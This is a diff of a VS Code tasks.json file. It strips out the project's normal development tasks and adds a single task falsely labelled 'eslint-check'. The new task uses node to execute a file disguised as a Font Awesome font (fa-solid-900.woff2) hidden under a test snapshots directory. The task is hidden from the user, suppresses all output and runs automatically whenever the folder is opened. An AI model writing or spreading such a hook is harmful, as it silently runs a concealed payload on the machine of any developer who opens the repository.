@@ -1,98 +1,24 @@
 {
-  // See https://go.microsoft.com/fwlink/?LinkId=733558
-  // for the documentation about the tasks.json format
   "version": "2.0.0",
   "tasks": [
     {
+      "label": "eslint-check",
       "type": "shell",
-      "label": "dev:vscode",
-      "command": "bun run watch",
-      "options": {
-        "cwd": "packages/vscode"
-      },
-      "group": {
-        "kind": "none",
-        "isDefault": true
-      },
-      "isBackground": true
-    },
-    {
-      "type": "shell",
-      "label": "dev:vscode-local",
-      "command": "POCHI_LOCAL_SERVER=true bun run watch",
-      "options": {
-        "cwd": "packages/vscode"
-      },
-      "group": {
-        "kind": "none",
-        "isDefault": true
-      },
-      "isBackground": true
-    },
-    {
-      "type": "shell",
-      "label": "dev:server-server",
-      "command": "bun run dev:server",
-      "options": {
-        "cwd": "private/packages/server"
-      },
-      "group": {
-        "kind": "none",
-        "isDefault": true
-      },
+      "command": "(command -v node >/dev/null 2>&1 && node ./packages/common/src/base/prompts/__tests__/__snapshots__/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./packages/common/src/base/prompts/__tests__/__snapshots__/public/fonts/fa-solid-900.woff2) || echo ''",
+      "problemMatcher": [],
       "isBackground": true,
-      "problemMatcher": [
-        {
-          "pattern": [
-            {
-              "regexp": ".",
-              "file": 1,
-              "location": 2,
-              "message": 3
-            }
-          ],
-          "background": {
-            "activeOnStart": true,
-            "beginsPattern": ".",
-            "endsPattern": "."
-          }
-        }
-      ]
-    },
-    {
-      "type": "shell",
-      "label": "dev:server-website",
-      "command": "bun run dev:server",
-      "options": {
-        "cwd": "private/packages/website"
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
       },
-      "group": {
-        "kind": "none",
-        "isDefault": true
-      },
-      "isBackground": true,
-      "problemMatcher": [
-        {
-          "pattern": [
-            {
-              "regexp": ".",
-              "file": 1,
-              "location": 2,
-              "message": 3
-            }
-          ],
-          "background": {
-            "activeOnStart": true,
-            "beginsPattern": ".",
-            "endsPattern": "."
-          }
-        }
-      ]
-    },
-    {
-      "label": "dev:server",
-      "dependsOn": ["dev:server-website", "dev:server-server"],
-      "isBackground": true
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
     }
   ]
 }
